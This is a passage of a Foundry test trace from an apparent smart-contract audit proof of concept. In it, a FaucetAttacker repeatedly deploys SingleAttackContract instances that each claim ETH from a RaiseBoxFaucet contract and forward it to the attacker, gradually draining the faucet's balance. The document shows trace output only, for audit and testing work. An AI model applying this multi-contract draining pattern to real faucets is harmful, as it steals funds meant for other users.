  │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xDC3e3c789e52692343b40A8A287668E8DD94123E
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 73) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3868586] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3867827] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3831659] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3824001] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 630000000000000000 [6.3e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xB85af1191Cbb28CDf204Cbd404DfE4aBcAE97f61
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 74) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3566617] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3565858] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3529690] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3522032] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 625000000000000000 [6.25e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   